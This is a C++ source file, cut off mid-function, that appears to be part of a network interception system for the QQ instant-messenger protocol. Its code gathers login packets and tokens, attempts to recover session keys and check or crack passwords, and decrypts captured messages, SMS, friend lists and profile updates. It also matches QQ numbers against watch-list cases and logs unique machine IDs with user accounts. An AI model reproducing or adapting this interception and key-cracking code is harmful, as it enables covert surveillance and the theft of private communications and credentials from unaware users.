//***************************************************************
//	Copyright (C) 2007 - ɽ������Ƽ���չ���޹�˾��Ȩ����
//	�ļ���: 	OICQ
//	�汾:		1.0
//	��������:	2007-7-13
//	����:		��ǿ
//	��Ҫ����:	Oicq����Э�鴦��
//	ģ������:	
//	��Ҫ����:	isOicqPacket
//
//**************************************************************** 
#include "stdafx.h"
//#include "..\\QQ_Crypt.h"
#include "imsg.h"
#include "Oicq.h"
#include "QQFunc.h"

/************************* OICQ **************************/
//extern BOOL isOicqPacket(DATEHEADER& packh, const char* pPacket);
//extern DWORD Swap4Byte(DWORD dat);

//**********************  Oicq����Э�鴦��  **********************************//
CMapStringToString g_rightqqmap(8192);
CMapStringToString g_wrongqqmap(8192);
void OutputOnePacket(OLDDATEHEADER& packh, const BYTE* pdata, char* outbuf, int& outlen);

extern map<CString,time_t> g_uniqmid;

#define QQ_LOGOUT	0
#define QQ_GETLIST	1
#define QQ_LOGIN	2
static LPCTSTR pQQCmd[3] =
{
	_T("����"),
	_T("������ߺ����б�"),
	_T("����")
};

int OicqPacket::InitPacket(DATEHEADER& packh, const char* pPacket, int direction, WORD qqcmd)
{
	int error=0;
	try
	{
		this->m_base = direction;
		if(direction == 7 || direction == 14)
		{
			this->m_bTCP = FALSE;
			this->m_bC2S = FALSE;
		}
		else if(direction == 9 || direction == 16)
		{
			this->m_bTCP = TRUE;
			this->m_bC2S = FALSE;
		}
		else if(direction == 11 || direction == 22 )
		{
			this->m_bTCP = FALSE;
			this->m_bC2S = TRUE;
		}
		else if( direction == 13 || direction == 24)
		{
			this->m_bTCP = TRUE;
			this->m_bC2S = TRUE;
		}
		else
		{
			return 0;
		}
		
		this->m_qqcmd = qqcmd;
		error=1;
		memcpy(&this->m_packetheader, &packh.m_type2, OLDHEADERLEN);
		m_pPacketData = new BYTE[packh.m_datalen];
		error=2;
		if (m_pPacketData!=NULL)
		{
			this->m_seq = Swap2Byte(*((WORD*)(pPacket+5)));
			memcpy(m_pPacketData, pPacket, packh.m_datalen);
		}
	}
	catch (...)
	{
		WriteLog(IMSGPRO, "InitPacket() Error!!=%d",error);
	}
	return 0;
}

OicqSession::OicqSession(DATEHEADER& packh, int aT, DWORD QQID)
: SocketSession(packh, aT)
{
	m_closetm = packh.m_tm + 90;
	// 	m_cmdtype = 0;
	m_sontype = 0;
	
	m_qqver = m_qqNO = 0;
	m_dwType = MAPTYPE_OICQ;
	m_loginTokenLen = 0;
	memset(m_loginToken, 0, sizeof(m_loginToken));
	
	memset(m_sessionkey,0, LEN_TEA_KEY);
	
	m_pMsgBuf = NULL;
	m_MsgBufLen = 0;
	m_filetm = packh.m_tm;
	
	if (QQID == 1)
	{
		// �����Ự����
		CString tstr = m_sip;
		m_sip = m_dip;
		m_dip = tstr;
		tstr = m_dmac;
		m_dmac = m_smac;
		m_smac = tstr;
		DWORD ip;
		memcpy(&ip, m_csip, 4);
		memcpy(m_csip, m_cdip, 4);
		memcpy(m_cdip, &ip, 4);
		m_AuthInfo.SwapAuthInfo();
	}
	
	// ƥ������Դ
	if (m_dataSrc == DATASRC_OTHER)
	{
		if (v_IdcIpLib.QueryIdcIP(Swap4Byte(*(DWORD*)m_cdip), m_strISP)
			|| v_IdcIpLib.QueryIdcIP(Swap4Byte(*(DWORD*)m_csip), m_strISP))
		{
			m_dataSrc = DATASRC_IDC;
		}
	}
	
	m_cntPacket = 0;
	g_OicqSion++;
}

// QQBuddyʹ�õĹ��캯��
OicqSession::OicqSession(OicqBuddy *pSion, SOCKETKEY& key)
{
	// ͨ��OicqBuddy���� ����һ��OicqSession����
	// �ù��캯��ֻ�����QQ��ϵ��������ʹ��
	m_pMsgBuf = NULL;
	m_MsgBufLen = 0;
	
	
	memcpy(m_csip, &key.sip, 4);
	m_sip.Format("%03u.%03u.%03u.%03u_%05d",
		m_csip[0], m_csip[1], m_csip[2], m_csip[3], key.sport);
	
	memcpy(m_cdip, &key.dip, 4);
	m_dip.Format("%03u.%03u.%03u.%03u_%05d",
		m_cdip[0], m_cdip[1], m_cdip[2], m_cdip[3], key.dport);
	if (pSion->m_DataSrc != DATASRC_CDMA)
	{
	//	FormatMac(pSion->m_mac, m_smac, m_dmac );
	}
	m_userid.Format("ID1:%u <==> ID2:%u", pSion->m_QQid1, pSion->m_QQid2);
	m_ProxyType = pSion->m_proxytype;
	m_dataSrc = pSion->m_DataSrc;
	m_spyaddr = pSion->m_spyaddr;
	m_AuthInfo = pSion->m_authinfo;
	m_begfiletm = pSion->m_FirstPackettm;
	m_endfiletm = 0;
	m_rubbishflag = FALSE;
	m_OpenCaseFlg = v_opencaseoicq;
	m_OpenIndxFlg = v_openflagoicq;
	m_OpenWarnFlg = v_openwarnoicq;
	
	m_cntPacket = 0;
	g_OicqSion++;
}

OicqSession::~OicqSession()
{
	if (m_pMsgBuf != NULL)
	{
		delete[] m_pMsgBuf;
		m_pMsgBuf = NULL;
	}
	
	CString ttstr;
	CQunINfo *pOb;
	POSITION pos = m_mapQun.GetStartPosition();
	while(pos != NULL)
	{
		m_mapQun.GetNextAssoc(pos, ttstr, (CObject*&)pOb);
		delete pOb;
	}
	m_mapQun.RemoveAll();
	
	g_OicqSion--;
}

BOOL OicqSession::CloseSession(time_t nowtm)
{
	
int err = 0;
	try{
		
	if (0 == (m_sontype & BIT_OKSESSION) )
	{
err = 1;
		m_packetlist.clear();
		return TRUE;
	}
	else
	{
err = 2;
		int dt = abs(nowtm - m_filetm);
		BOOL bEnd = (abs(nowtm - m_lastpacktm) >= 300);
		// 		if (m_cmdtype & 1)//ȡ���յ����߰���ɾ���Ự����ʱ����һ�ε�����
		// 		{
		// 			// �յ������ߵİ�
		// 			bEnd = TRUE;
		// 		}
		// 		m_cmdtype = 0;
		m_closetm += 60;
		
		if (m_sontype & BIT_OKSESSION)
		{
err = 3;
			// ���Ի�ԭ�ͻ�ԭ
			// 			if (m_LoginRes.m_pPacketData!=NULL)
			// 			{
			// 				delete[] m_LoginRes.m_pPacketData;
			// 				m_LoginRes.m_pPacketData = NULL;
			// 			}
			// 			if (m_LoginReq.m_pPacketData!=NULL)
			// 			{
			// 				delete[] m_LoginReq.m_pPacketData;
			// 				m_LoginReq.m_pPacketData = NULL;
			// 			}
			
			ParseQQPacketList();
		}
err = 4;
		CString ttstr;
		CQunINfo *pOb;
		POSITION pos = m_mapQun.GetStartPosition();
		while(pos != NULL)
		{
			m_mapQun.GetNextAssoc(pos, ttstr, (CObject*&)pOb);
err = 5;
			if(pOb->strQunNo.GetSize() > 0)
			{
err = 6;
				WriteQQGroup(pOb->strQunNo);
			}
			pOb->strQunNo.RemoveAll();
			m_mapQun.SetAt(ttstr, (CObject*&)pOb);
		}
		return bEnd;
	}

	}catch(...){
		WriteLog(IMSGPRO, "OicqSession::CloseSession Error!!=%d", err);
	}
	return TRUE;
}

void OicqSession::CopyLoginSeg(OicqSession *pLogin)
{
	int error=0;
	try
	{
		OicqPacket tmpPacket;
		DWORD ttsontype = m_sontype;
		// ȥ�����,����֤����,��ƥ�䰸����־λ,��������ӦSessionKey��
		m_sontype = pLogin->m_sontype & (~(UNIT_OUT|BIT_S2C_0x30));		
		m_sontype |= ttsontype;		
		for(OicqPacketListIt begin = pLogin->m_loginList.begin();
		begin != pLogin->m_loginList.end(); begin++)
		{
			if(begin->m_qqcmd != 0x30)	// ���ƻỰʱ, 30����Ҫ
			{
				error=2;
				tmpPacket.m_bC2S = begin->m_bC2S;
				tmpPacket.m_base = begin->m_base;
				tmpPacket.m_qqcmd = begin->m_qqcmd;
				memcpy(&(tmpPacket.m_packetheader), &(begin->m_packetheader), OLDHEADERLEN);
				error=3;
				
				tmpPacket.m_pPacketData = new BYTE[begin->m_packetheader.m_datalen];
				int len=begin->m_packetheader.m_datalen;
				error=4;
				if (tmpPacket.m_pPacketData!=NULL)
					memcpy(tmpPacket.m_pPacketData, begin->m_pPacketData, begin->m_packetheader.m_datalen);
				error=5;
				m_loginList.push_back(tmpPacket);
			}
		}
		tmpPacket.m_pPacketData = NULL;
	}
	catch (...)
	{
		WriteLog(IMSGPRO, "CopyLoginSeg() Error!!=%d",error);
	}
}

BOOL OicqSession::CheckHaveGo()
{
	if(0 == (m_sontype & BIT_OKSESSION)
		|| 0 == (m_sontype & BIT_CHKPASS))
	{
		// δ�ɹ�����sessionkey��δ��������
		if(m_qqver < QQ2009P4)
		{
			if(m_sontype & BIT_S2C_0x30)
				return TRUE;
		}
		else
		{
			if(GO_QQ2009 == (m_sontype & GO_QQ2009))
				return TRUE;
			else 
			{
				if(BIT_OKSESSION == (m_sontype & BIT_OKSESSION))
				{
					if(m_sontype & BIT_S2C_0x30)
						return TRUE;
				}
			}
		}
	}
	return FALSE;
}

#define _DBGQQ
BOOL OicqSession::CheckHaveCrack()
{
	BOOL bCrack = FALSE;
	if(CRK_QQ2 == (m_sontype & CRK_QQ2))
		bCrack = TRUE;
	else if(CRK_QQ3 == (m_sontype & CRK_QQ3))
		bCrack = TRUE;
	else if(CRK_QQ4 == (m_sontype & CRK_QQ4))
		bCrack = TRUE;
	if(bCrack)
	{
		if(BIT_OKSESSION == (m_sontype & BIT_OKSESSION))
			bCrack = FALSE;		/// ������ȷ����, �������
		else if(BIT_CHKPASS != (m_sontype & BIT_CHKPASS))
			bCrack = FALSE;		/// δ�����ƽ��
	}

	return bCrack;
}

void OicqSession::FormatQQUid()
{
	static time_t tmcheck = 0;
	CString strmid;

	BYTE*   pTmpData = NULL;
	int		ptmplen = 0;
	BYTE dekey[20];
	bytebuffer pbuf;
	token ttToken;
	if(FindPacket(0xdd, &pTmpData, ptmplen, TRUE, -1))
	{
		// 0xdd C->S
		memcpy(dekey, pTmpData, 16);
		pTmpData+=16;
		ptmplen -=16;
		if (DecryptQQPacket(pTmpData, ptmplen,
			dekey, (BYTE*)g_pMsgBuffer))
		{
			if(ptmplen > 0x100)
			{
				memcpy(pbuf.data, g_pMsgBuffer, ptmplen);
				pbuf.len = ptmplen;
				pbuf.pos = 0xe8;	// 0x40 see myqq prot_login.c
				pbuf.size = ptmplen;
				if( pbuf.data[0x17] == 0x38 && pbuf.data[0x51] == 0x78 &&
					pbuf.data[0xcb] == 0x14 && memcmp(pbuf.data+0xe8, "\x0\x10", 2) == 0)
				{
// 043E5640  00 DE 00 01 00 00 08 04 01 E0 00 00 03 50 00 00  .............P..
// 043E5650  00 01 00 00 0D 6F 00 38 72 DE 73 62 C4 61 80 49  .....o.8r�sb�a.I
// 043E5660  EC CD F1 8D 94 63 D0 46 0B 34 A5 0F 26 D8 29 12  ���c�F.4..&.).
// 043E5670  B9 C7 3E AB 17 0B F7 A5 50 7C 1A 3E CA E1 49 83  ��>...��P|.>��I.
// 043E5680  85 C9 60 38 EF 44 E0 B0 B6 B6 89 05 EC C5 37 53  ��`8�Dశ�..��7S
// 043E5690  00 78 4F A3 F7 9E 32 8A FE 45 06 48 F6 8C 24 2F  .xO��.2��E.H��$/
// 043E56A0  AD A5 20 11 92 10 2A C3 4A 68 89 C6 78 9F DF 34  �� ...*�Jh��x��4
// 043E56B0  82 2B F8 B0 4B 98 58 EC 6F 1D 98 A2 01 51 D2 15  .+��K�X�o.��.Q..
// 043E56C0  45 DB 48 C4 9A FC A3 1F 23 C1 57 68 60 26 46 4E  E�HĚ��.#�Wh`&FN
// 043E56D0  CF 79 0C E1 75 E0 FA CC 24 6E 94 76 17 06 D0 F3  �y.�u��.$n�v..��
// 043E56E0  01 24 FA 74 8F DA AA 85 49 00 BC F6 57 91 27 1E  .$�t�ڪ�I.��W.'.
// 043E56F0  23 24 67 BA 28 13 BA 9F 98 94 47 85 23 B7 F8 C8  #$g.(.����G.#��.
// 043E5700  ED FA 20 C5 BD AC 5B 7E 25 8A 00 14 C3 89 E4 19  �� Ž�[~%...É..
// 043E5710  1F 37 42 9F 21 85 66 40 61 E0 7B 5D DE E8 EE C0  .7B.!�f@a�{]����
// 043E5720  01 77 2E 01 27 96 72 F5 00 10<D2 BB 84 74 63 70  .w..'�r...һ�tcp
// 043E5730  E0 74 BB 8C 42 24 F8 21 3D 1A>02 E6 35 77 84 00  �t��B$.!=...5w..
// 043E5740  10 91 BA 5B 8A 37 FE 67 29 02 F9 BD 9B FF 7F 68  .��[.7�g).��...h
// 043E5750  EF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
					get_token(&pbuf, &ttToken);
					if(ttToken.len == 0x10)
					{
						char *pmidbuf = strmid.GetBufferSetLength(64);
						memset(pmidbuf, 0, 64);
						for (int ii = 0; ii < 0x10 ; ii++)
							sprintf(pmidbuf+ii*2, "%02x", ttToken.data[ii]);
						strmid.ReleaseBuffer(-1);
					}
					if(strmid.GetLength() != 32)
						return ;
				}
			}
		}
	}
	if(strmid.IsEmpty())
		return ;

	map<CString,time_t>::iterator It;
	It = g_uniqmid.find(strmid);
	if(It != g_uniqmid.end())
	{
		It->second = time(0);
	}
	else
	{
		// ��ʽ: ʱ�� ���� Ψһֵ �����ʺ� ID��   
		// ����Ϊ 360��qq  .  
		// ��Ϊ360ʱ������������ʺ�,IDΪ��.  
		// qqʱ���Բ���Ҫ���������ʺ�,idΪqq��.  
		CString tmpbcp;
		tmpbcp.Format("%s\tqq\t%s\t%s\t%s", 
			CTime::GetCurrentTime().Format("%Y-%m-%d %H:%M:%S"), 
			strmid, 
			m_AuthInfo.m_UserAccount1,
			"");
		g_uniqmid[strmid] = time(0);
		WriteArrToData(HTTP_PROTOCOL, UNIMID_DATA, tmpbcp, NULL, NULL);
	}
	
	if(abs(time(0)-tmcheck) > 10*60)
	{
		if(g_uniqmid.size() > 10000)
		{
			WriteLog("dce", "2.uniq mid map have item %d", g_uniqmid.size());
		}
		
		CStringArray arrErase;
		time_t tmnow = time(0);
		for (It = g_uniqmid.begin(); It != g_uniqmid.end(); It++)
		{
			if(abs(tmnow-It->second) > 30*60)
			{
				// 30����δ�ٳ�������
				arrErase.Add(It->first);
			}
		}
		for (int iie = 0; iie < arrErase.GetSize() ; iie++)
		{
			g_uniqmid.erase(arrErase[iie]);
		}
	}

	return ;
}

int OicqSession::InsertPacket(DATEHEADER& packh,const char *pPacket)
{

	BakProData(PRO_OICQ, packh, pPacket);
	int error=0;
	try
	{
		WORD cmdid, qqver;
		cmdid = qqver = 0;
		DWORD qqNum = isOicqPacket(packh, pPacket, cmdid, qqver);
		if (qqNum==0)	// TCP�����ж����ϵ����
		{
			return 0;	// �����OicqSession
		}
		error=1;
		if(g_dbgSwitch.m_outqqcmd)
		{
			printf("QQID:%-10d, QQCmd:0x%04x, QQVer:0x%04x, datalen:%d\r\n", 
				qqNum, cmdid, qqver, packh.m_datalen);
		}
		m_lastpacktm = packh.m_tm;
		if ((packh.m_type==ProxyTCP) || (packh.m_type==ProxyUDP))
		{
			m_ProxyType = 1;
			packh.m_type -= 6;	// ProxyTCP -> TCPPacket ProxyUDP -> UDPPacket
		}
		error=2;
		//  ��ȡ�����
		WORD base;
		if (packh.m_type==TCPPacket)
		{
			cmdid = (BYTE)pPacket[5]*256+(BYTE)pPacket[6];
			base = 2;
		}
		else
		{
			ASSERT(packh.m_type == UDPPacket);
			cmdid = (BYTE)pPacket[3]*256+(BYTE)pPacket[4];
			base = 0;
		}
		error=3;
		//ASSERT(m_userid != "739720883");
		// 	ASSERT(packh.sport != 1977);
		// 	ASSERT(packh.dport != 1977);
		BOOL bNeedChk = FALSE;	// �Ƿ����㹻���Խ�SessionKey
		if (qqNum > 10000)
		{
			/// offset packet
			m_qqver = qqver;	// �汾
			m_qqNO = qqNum;
			// Client --> Server
			if (0 == (m_sontype & BIT_MATCHCASE))
			{
				m_userid.Format("%u", qqNum);		/// �õ�QQ��
				// û��ƥ�䰸����Ϣ��ƥ�䰸����Ϣ
				DWORD dwstate = 0;
				SearchCaseOrWarn(this, m_userid, m_userid.GetLength(), dwstate);
				SearchCaseEmailIm(this, m_userid, m_userid.GetLength(), 0);
				
				m_sontype |= BIT_MATCHCASE;
				if (m_CaseArr.GetSize() > 0)
				{
					m_sontype |= BIT_ISCASE;			// �ǰ���
				}
			}
			error=4;
			base += 11;
			if(qqver >= QQ2009SP5)
			{
				base += 11;
			}
			OicqPacket tmppacketcs;
			tmppacketcs.InitPacket(packh, pPacket, base, cmdid);
			m_bloginsort = FALSE;
			switch(cmdid)
			{
			case 0x00ba:
				{
					m_loginList.push_front(tmppacketcs);
					tmppacketcs.m_pPacketData = NULL;
					//m_sontype |= BIT_C2S_0xdd;		// �õ��˵�¼��
				}
				break;
			case QQ_0xdd:
				{
					m_loginList.push_front(tmppacketcs);
					tmppacketcs.m_pPacketData = NULL;
					m_sontype |= BIT_C2S_0xdd;		// �õ��˵�¼��

					FormatQQUid();		// �������Ψһֵ
				}
				break;
			case QQ_0xe5:
				{
					unsigned char *pQQData = (unsigned char*)pPacket+base;
					UINT tmpLen = pQQData[0]*256 + pQQData[1];
					if(tmpLen < 0x100)
					{
						m_loginTokenLen = tmpLen;
						memcpy(m_loginToken, pQQData+2, tmpLen);
					}
				}
				break;
			case QQ_CMD_LOGIN:
			case QQ2013_CMD_LOGIN:
			case TM_CMD_LOGIN:
				{
					if(cmdid == QQ_0x30 && m_qqver >= QQ2009P4)
					{
						unsigned char *pQQData = (unsigned char*)pPacket+base;
						UINT tmpLen = pQQData[0]*256 + pQQData[1];
						if(tmpLen < 0x100)
						{
							m_loginTokenLen = tmpLen;
							memcpy(m_loginToken, pQQData+2, tmpLen);
							if(0 == (m_sontype & BIT_S2C_0xe5))
							{
								SocketSession *pLogin = NULL;
								OicqSession *pLoginQQ = NULL;
								// ��������QQ�Ự, �ҵ�½�������ڻỰ
								POSITION pos = g_pImsgMissObj->m_SocketMap.GetStartPosition();
								CString rKey;
								while(pos != NULL)
								{
									g_pImsgMissObj->m_SocketMap.GetNextAssoc(pos, rKey, pLogin);
									if(pLogin==NULL)
										continue;
									if(pLogin->m_dwType == MAPTYPE_OICQ) 
									{
										pLoginQQ = (OicqSession*)pLogin;
										if(pLoginQQ->m_loginTokenLen > 0 && pLoginQQ != this)
										{
											if ( pLoginQQ->m_loginTokenLen == m_loginTokenLen 
												&& 0 == memcmp(pLoginQQ->m_loginToken, m_loginToken, m_loginTokenLen))
											{
												ASSERT(pLoginQQ->m_qqNO == m_qqNO);
												CopyLoginSeg(pLoginQQ);
												break;
											}
										}
									}
								}	/// end while �������лỰ
							}
						}
					}
					m_loginList.push_front(tmppacketcs);
					tmppacketcs.m_pPacketData = NULL;
					m_sontype |= BIT_C2S_0x30;		// �õ��˵�¼��
					
					if(m_qqver >= QQ2009P4)
					{
						/// �����в���һ̨����ʱ���п��ܻ���������ȵ������к󵽣����ڴ˴�Ҳ���Ӽ����Ƿ�ȫ�ˣ�����Ƿ�߱����Եõ�SessionKey����
						//ֻ���qq2009֮��İ汾
						bNeedChk = CheckHaveGo();
					}
				}
				break;
			case 0x1d:
				{
					m_sontype |= BIT_C2S_0x1d;	// �õ���(�л�״̬), ȷ�ϵ�½�ɹ�
				}
				break;
			}
		}
		else
		{
			base += 7;
			if(qqver >= QQ2009SP5)
			{
				base += 7;
			}
			OicqPacket tmppacketsc;
			tmppacketsc.InitPacket(packh, pPacket, base, cmdid);
			switch(cmdid)
			{
			case 0x00ba:	// Server --> Client
				{
					m_loginList.push_front(tmppacketsc);
					tmppacketsc.m_pPacketData = NULL;
					//m_sontype |= BIT_S2C_0xdd;
				}
				break;
			case QQ_0xdd:	// Server --> Client
				{
					m_loginList.push_front(tmppacketsc);
					tmppacketsc.m_pPacketData = NULL;
					m_sontype |= BIT_S2C_0xdd;
				}
				break;
			case QQ_0xe5:	// Server --> Client
				{
					m_loginList.push_front(tmppacketsc);
					tmppacketsc.m_pPacketData = NULL;
					m_sontype |= BIT_S2C_0xe5;
				}
				break;
			case QQ_CMD_LOGIN:
			case TM_CMD_LOGIN:	// Server --> Client
				{
					m_loginList.push_front(tmppacketsc);
					tmppacketsc.m_pPacketData = NULL;
					m_sontype |= BIT_S2C_0x30;	// �õ���SessionKey�İ�
					
					bNeedChk = CheckHaveGo();	/// ����Ƿ�߱����Եõ�SessionKey����
				}
				break;
			case 0x1d:
				{
					m_sontype |= BIT_S2C_0x1d;	// �õ���(�л�״̬), ȷ�ϵ�½�ɹ�
				}
				break;
			}
		}
error=9;	
		if (bNeedChk)
		{
			// bNeedChk ������������½��(��sessionkey)ʱ���
			// �����������Ϊ��
			//	1��δ�����������Ѿ����Գ��Լ��.
			//	2�������뵫δ�ɹ����ܴ�ʱ�ֳ��ֵ�½��
			//if(m_qqNO == 1007014962)
			{
#ifdef _DEBUG
				printf("try checkqqpass %d, %s_%s\n", m_qqNO, this->m_sip, this->m_dip);
#endif
				if(m_sontype & BIT_OKSESSION )
				{
					// �ڻ����Sessionkeyǰ�ܻ�ԭ�Ĵ����
					ParseQQPacketList();
				}

				// ���Ի��sessionkey
				CheckOicqPassword(m_qqNO);
			}
		}
error=111;	
		
		// ����λ��Ϣ
		FormatOicqPacket(qqver, cmdid, packh.m_tm);
		if(bNeedChk)
		{
			if(m_sontype & BIT_OKSESSION)
			{
				// �ɹ����sessionkey, ���½�����Ѽ��������־λ
				// �Ա���ʱ���ظ�����, �Ự��ͬ��sessionkey�Ѿ���������
				if(m_qqver < QQ2009P4)
					m_sontype &= (~(BIT_S2C_0x30 | BIT_CHKPASS));
				else
					m_sontype &= (~(GO_QQ2009 | BIT_CHKPASS));
				m_loginList.clear();
			}
		}
		
// 		if(0 == (m_sontype & (BIT_OKSESSION|BIT_ISCASE)))
		if(0 == (m_sontype & BIT_OKSESSION))
		{
			// û�õ�SessionKey, ����Ҫ������
			// ԭ����BIT_ISCASE����Ϊ�����.ocp, ���ڸù���ȡ����
			return FALSE;
		}
		if(g_dbgSwitch.m_dbgqq || g_dbgSwitch.m_dbgqqu)
		{
			if(m_sontype & BIT_OKSESSION)
			{
				CreateDir("v:\\dbgqq");
				CString outfile, outfileu;
				outfile.Format("v:\\dbgqq\\%s_%s_%04d_%010u_%02x_%04x.dat", 
					m_sip, m_dip, m_cntPacket++, m_qqNO, m_qqver, cmdid);
				outfileu.Format("v:\\dbgqq\\%s_%s_%010u_%02x.dat", 
					m_sip, m_dip, m_qqNO, m_qqver);
				CFile fpqq, fpqqu;
				if(g_dbgSwitch.m_dbgqq)
				{
					if(fpqq.Open(outfile, CFile::modeCreate|CFile::modeWrite))
					{
						fpqq.WriteHuge(pPacket, packh.m_datalen);
					}
				}
				if(g_dbgSwitch.m_dbgqqu)
				{
					if(fpqqu.Open(outfileu, CFile::modeCreate|CFile::modeWrite|CFile::modeNoTruncate))
					{
						fpqqu.SeekToEnd();
						fpqqu.WriteHuge("================", 16);
						fpqqu.WriteHuge(pPacket, packh.m_datalen);
					}
				}
				
				
				BYTE *pData = (BYTE*)pPacket+base;
				int len = packh.m_datalen-base-1;
				if (DecryptQQPacket(pData, len, m_sessionkey, (BYTE*)g_pMsgBuffer))
				{
					if(g_dbgSwitch.m_dbgqq)
					{
						fpqq.WriteHuge("----------------", 16);
						fpqq.WriteHuge(g_pMsgBuffer, len);
					}
					if(g_dbgSwitch.m_dbgqqu)
					{
						fpqqu.WriteHuge("----------------", 16);
						fpqqu.WriteHuge(g_pMsgBuffer, len);
					}
				}
				
				if(fpqq.m_hFile != CFile::hFileNull)
					fpqq.Close();
				if(fpqqu.m_hFile != CFile::hFileNull)
					fpqqu.Close();
			}
		}
error=10;
		// �������ݰ�������
		BOOL bNeed = FALSE;
		this->m_lastpacktm = packh.m_tm;
		// 	if(qqver > TM2008)	// �������ذ�, �ް汾
		{
			switch(cmdid)
			{
			case TM_CMD_RECV_IM:
			case TM_CMD_SEND_IM:
				bNeed = TRUE;
				break;
			case TM_CMD_LOGOUT:
				m_closetm = packh.m_tm + 60;	// ����1���Ӻ�رջỰ
			}
		}
		error=11;
		if(FALSE == bNeed)
		{
			switch(cmdid)
			{
			case QQ_CMD_RECV_IM:			// ������Ϣ
			case QQ_CMD_SEND_IM:			// ������Ϣ
			case QQ_CMD_GET_FRIENDS_ONLINE:	// ������ߺ����б�
			case QQ_CMD_GET_USER_INFO:		// ��½ʱ��
			case QQ_CMD_SEND_SMS:			// �ֻ�����
			case QQ_CMD_UPDATE_INFO:		// �޸ĸ�����Ϣ
			case QQ_CMD_GET_FRIENDS_LIST:	// ��ú����б�(ֻ���״�ʹ��qqʱ����)
				// ��Щ��Ҫ���浽����
				bNeed = TRUE;
				break;
			case 0xA1:
				m_closetm = packh.m_tm + 60;	// ����1���Ӻ�رջỰ
				break;
			case 0x62:
				if(m_qqver > TM2008)		// �汾>=141c ��0x62Ϊ�ͻ��˷���������
					m_closetm = packh.m_tm + 60;	// ����1���Ӻ�رջỰ
				break;
			case QQ_CMD_QUN:
				if(m_qqver >= QQ2009P4)
					bNeed = TRUE;
				break;
			case QQ_CMD_GET_BUDDY_LIST:
				if(m_qqver >= QQ2009P4)
					bNeed = TRUE;
				break;
			default:
				{
					if(packh.m_type != TCPPacket)	
						return 0;
					error=12;
					// �ж�TCP��(��QQ��)����û���账�������
					int qqcmd = cmdid;
					BYTE *pQQData = (BYTE*)pPacket;
					int PartLen = pQQData[0]*256+pQQData[1];
					int TotalLen = packh.m_datalen;
					while((TotalLen > 0) && (TotalLen >= PartLen)
						&& (pQQData[2] == 2) && (pQQData[PartLen-1] == 3)
						&& FALSE == bNeed)
					{
						TotalLen -= PartLen;
						pQQData += PartLen;
						
						if(TotalLen > 0)
						{
							PartLen = pQQData[0]*256+pQQData[1];
							if(pQQData[2]==2 && pQQData[PartLen-1]==3)
							{
								qqcmd = pQQData[5]*256+pQQData[6];
								switch(qqcmd)
								{
								case QQ_CMD_RECV_IM:			// ������Ϣ
								case QQ_CMD_SEND_IM:			// ������Ϣ
								case QQ_CMD_GET_FRIENDS_ONLINE:	// ������ߺ����б�
								case QQ_CMD_GET_USER_INFO:		// ��½ʱ��
								case QQ_CMD_SEND_SMS:			// �ֻ�����
								case QQ_CMD_UPDATE_INFO:		// �޸ĸ�����Ϣ
								case QQ_CMD_GET_FRIENDS_LIST:	// ��ú����б�(ֻ���״�ʹ��qqʱ����)
									// ��Щ��Ҫ���浽����
									bNeed = TRUE;
									break;
								case 0xA1:
									m_closetm = packh.m_tm + 60;	// ����1���Ӻ�رջỰ
									break;
								case 0x62:
									if(m_qqver > TM2008)		// �汾>=141c ��0x62Ϊ�ͻ��˷���������
										m_closetm = packh.m_tm + 60;	// ����1���Ӻ�رջỰ
									break;
								case QQ_CMD_QUN:
									if(m_qqver >= QQ2009P4)
										bNeed = TRUE;
									break;
								case QQ_CMD_GET_BUDDY_LIST:
									if(m_qqver >= QQ2009P4)
										bNeed = TRUE;
									break;
								}
							}
						}
					}	// ÿ����2ͷ,3β
				}
			}
		}
		if(FALSE == bNeed)
		{
			return 0;					// ʣ��������Ҫ����
		}
error=13;
		// �����������
		OicqPacket tmppacket(packh, pPacket, base, cmdid);
		m_packetlist.push_back(tmppacket);
		tmppacket.m_pPacketData = NULL;
		if (m_packetlist.size() > 50)
		{
			// ���������
// 			if (0 == (m_sontype & BIT_CHKPASS))
// 			{
// 				// ���û����֤���������������5����
// 				for (int i=0; i<5; i++)
// 				{
// 					m_packetlist.pop_front();
// 				}
// 			}
// 			else 
			if (m_sontype & BIT_OKSESSION)
			{
error=14;
				// ���Ի�ԭ�ͻ�ԭ
				return ParseQQPacketList();
			}
		}
		return 0;
	}
	catch (...)
	{
		WriteLog(IMSGPRO, "InsertoicqPacket() Error!!=%d;packh.len=%d",error,packh.m_datalen);
		return -3;
	}
	
}

BOOL OicqSession::FindPacket(WORD cmdid, BYTE **pPacket, int &lenPacket, BOOL bC2S, int seq)
{
	if(FALSE == m_bloginsort)
	{
		m_loginList.sort();
		m_bloginsort = TRUE;
	}

	BOOL bFind = FALSE;
	OicqPacketListIt findit;
	OicqPacketListIt begin, end;
	begin = m_loginList.begin();
	end = m_loginList.end();
	int iskip = 0;
	while(begin != end)
	{
		if(begin->m_qqcmd == cmdid)
		{
#ifdef _DEBUG
			OicqPacket *pP = &(*begin);
#endif
			if(bC2S && (begin->m_bC2S))
			{
				// ��������Ӧ, baseΪ 11(UDP)��13(TCP)
				if(seq == -1)
				{
					bFind = TRUE;
					findit = begin;		// ѭ��������, findit����¼�б��з������������һ��
				}
				else if(iskip == seq)
				{
					findit = begin;		// �õ���seq�����������ļ�¼
					bFind = TRUE;
					break;
				}
				iskip ++;
			}
			else if( FALSE == bC2S && (FALSE == begin->m_bC2S))
			{
				// ��������Ӧ, baseΪ 7(UDP)��9(TCP)
				if(seq == -1)
				{
					bFind = TRUE;
					findit = begin;
				}
				else if(iskip == seq)
				{
					findit = begin;
					bFind = TRUE;
					break;
				}
				iskip ++;
			}
		}
		begin ++;
	}
	if(bFind)
	{
		*pPacket = findit->m_pPacketData+findit->m_base;
		lenPacket = findit->m_packetheader.m_datalen-findit->m_base-1;
	}
	
	return bFind;
}




//���ݻ�����ȡrand,һ��1�ֽ�
void Change(DWORD* v0)
{
	(*v0) = 214013 * (*v0) + 2531011;
}




int checkqqpass(unsigned char* key,unsigned char* debuf,int debuflen)
{
	unsigned char lpPwd2[1024];
	int lPwdLen2 = 1024;
	if(qq_crypt2(DECRYPT, debuf, debuflen,
		(unsigned char *)key,
		lpPwd2, &lPwdLen2))
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

//������,���Ǽ�ס����ʱ����
BOOL GetQQDDDownKey(BYTE* DD_tmpkey,BYTE* BA_checkkey,BYTE* DD_Downbuf,int DD_buflen)
{	
	BYTE RESULT[4];
	memset(RESULT, 0, 4);
	RESULT[2] = BA_checkkey[0];
	//��Ϊ���Է���ֻ��3���ֽھ��ܳ�������������
//	for (int m1=0; m1<=255; m1++)
	{
